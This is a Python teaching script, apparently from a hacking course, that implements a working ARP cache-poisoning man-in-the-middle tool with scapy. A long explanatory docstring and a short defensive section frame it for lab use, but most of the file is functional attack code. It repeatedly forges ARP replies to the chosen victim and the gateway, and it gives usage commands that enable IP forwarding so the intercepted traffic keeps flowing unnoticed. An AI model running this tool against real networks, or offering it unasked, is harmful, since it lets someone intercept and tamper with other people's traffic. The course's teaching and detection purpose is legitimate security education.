#!/usr/bin/env python3
"""
arp_spoofer.py — become the "man in the middle" via ARP cache poisoning.

================================ THE LESSON ================================

RECAP: HOW ARP RESOLVES IPs (see network_scanner.py)
    To talk to 192.168.1.1 (the router) a host asks "who has 192.168.1.1?" and
    caches the MAC it gets back. From then on it ships frames for the router to
    that MAC without asking again.

THE WEAKNESS: ARP IS UNAUTHENTICATED AND GULLIBLE
    Two fatal design properties:
        1. No authentication — a reply carries no proof it's genuine.
        2. Hosts accept UNSOLICITED replies ("gratuitous ARP") and happily
           overwrite their cache with whatever a reply claims.
    So we can simply TELL the target "192.168.1.1 (the router) is at MY MAC"
    and TELL the router "the target is at MY MAC". Both believe us and start
    sending their traffic to us. We are now in the middle of their conversation.

WHY WE MUST FORWARD PACKETS
    If we poison both sides but *drop* the traffic, the target loses internet
    and immediately notices — a useless, obvious attack. So we turn on IP
    forwarding in the Linux kernel:
        echo 1 > /proc/sys/net/ipv4/ip_forward
    Now traffic flows target -> us -> router -> internet and back, invisibly.
    THIS is the position tools #5-7 (dns_spoofer, file_interceptor,
    code_injector) depend on. ARP spoofing is the doorway; they are what you do
    once you're through it.

RESTORING ON EXIT (BE A CLEAN ATTACKER, EVEN IN A LAB)
    While we spoof, both caches are wrong. If we just quit, the target stays
    broken until its ARP entry times out. So on Ctrl+C we send CORRECT ARP
    replies to put the real MACs back — the "restore" step. It's good practice
    and it teaches signal handling.

=============================== THE PYTHON ================================
    * Object-Oriented Programming — the whole tool is one ArpSpoofer class.
      State (target IP, gateway IP, their real MACs, a packet counter) lives in
      `self`; behaviour lives in methods. This is the course's big OOP example.
    * scapy ARP crafting — ARP(op=2, ...) builds a reply ("op=2" = is-at).
    * loops + time.sleep — re-send every ~2s because real ARP traffic keeps
      refreshing the real entry; we must keep overwriting it.
    * try/except KeyboardInterrupt — clean shutdown and restore.

=========================== DEFENSIVE TAKEAWAY ===========================
    ARP spoofing is loud if you know what to look for — that's what tool #8,
    arpspoof_detector.py, does: one IP suddenly mapping to a new MAC, or two
    IPs sharing one MAC. To PREVENT it:
        - "Dynamic ARP Inspection" (DAI) on managed switches drops forged
          replies by checking them against a trusted DHCP-snooping table.
        - Static ARP entries for critical hosts (the gateway) can't be
          overwritten by a reply.
        - Encryption (HTTPS/TLS, VPN) means even a successful MITM sees only
          ciphertext — which is the single most important real-world defense.

USAGE (inside your lab, as root):
    echo 1 > /proc/sys/net/ipv4/ip_forward        # enable forwarding first
    sudo python3 arp_spoofer.py -t 192.168.1.5 -g 192.168.1.1
===========================================================================
"""

import argparse
import time

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import Ether, ARP, srp, send


def get_arguments():
    parser = argparse.ArgumentParser(description="ARP-spoof a target and the gateway (lab use only).")
    parser.add_argument("-t", "--target", dest="target", required=True,
                        help="Victim IP, e.g. 192.168.1.5")
    parser.add_argument("-g", "--gateway", dest="gateway", required=True,
                        help="Gateway/router IP, e.g. 192.168.1.1")
    return parser.parse_args()


class ArpSpoofer:
    """Encapsulates one MITM spoofing session between a target and a gateway.

    All per-session state lives on the instance (`self`), which is exactly what
    OOP is for: we could create two ArpSpoofer objects for two different targets
    and they wouldn't interfere with each other.
    """

    def __init__(self, target_ip, gateway_ip):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        # We need each party's REAL MAC so we can restore the caches later.
        self.target_mac = self.get_mac(target_ip)
        self.gateway_mac = self.get_mac(gateway_ip)
        self.sent_count = 0

        if not self.target_mac or not self.gateway_mac:
            raise SystemExit("[-] Could not resolve both MACs. Are the hosts up and on your subnet?")

    @staticmethod
    def get_mac(ip):
        """Resolve one IP to its MAC with a normal (honest) ARP request.

        This is the same technique as network_scanner.py, narrowed to a single
        IP. Marked @staticmethod because it needs no instance state.
        """
        request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
        answered, _ = srp(request, timeout=2, verbose=False)
        return answered[0][1].hwsrc if answered else None

    def spoof(self, victim_ip, victim_mac, impersonate_ip):
        """Tell `victim_ip` that `impersonate_ip` is at OUR MAC.

        ARP(op=2) is an ARP *reply* ("is-at"). We set:
            pdst / hwdst = the victim we're lying to
            psrc         = the IP we're pretending to be
        We deliberately leave `hwsrc` unset so scapy fills in OUR real MAC —
        that's the lie: "<impersonate_ip> is at <our MAC>". send() ships it at
        Layer 3. The victim overwrites its cache, no questions asked.
        """
        packet = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=impersonate_ip)
        send(packet, verbose=False)

    def restore(self, victim_ip, victim_mac, real_ip, real_mac):
        """Send the CORRECT mapping to undo our poisoning for one victim.

        Same ARP reply, but now with the truth: real_ip is at real_mac. We send
        it a few times to make sure it lands before we exit.
        """
        packet = ARP(op=2, pdst=victim_ip, hwdst=victim_mac,
                     psrc=real_ip, hwsrc=real_mac)
        send(packet, count=4, verbose=False)

    def run(self):
        print(f"[i] Target  {self.target_ip} -> {self.target_mac}")
        print(f"[i] Gateway {self.gateway_ip} -> {self.gateway_mac}")
        print("[+] Spoofing... press Ctrl+C to stop and restore.\n")
        try:
            while True:
                # Lie to the target: "the gateway is at my MAC"
                self.spoof(self.target_ip, self.target_mac, self.gateway_ip)
                # Lie to the gateway: "the target is at my MAC"
                self.spoof(self.gateway_ip, self.gateway_mac, self.target_ip)
                self.sent_count += 2
                print(f"\r[+] Packets sent: {self.sent_count}", end="")
                # Re-send periodically: legitimate ARP traffic keeps correcting
                # the caches, so we must keep overwriting them.
                time.sleep(2)
        except KeyboardInterrupt:
            print("\n[i] Ctrl+C — restoring ARP tables, please wait...")
            self.restore(self.target_ip, self.target_mac, self.gateway_ip, self.gateway_mac)
            self.restore(self.gateway_ip, self.gateway_mac, self.target_ip, self.target_mac)
            print("[+] Restored. Exiting cleanly.")


def main():
    args = get_arguments()
    spoofer = ArpSpoofer(args.target, args.gateway)
    spoofer.run()


if __name__ == "__main__":
    main()
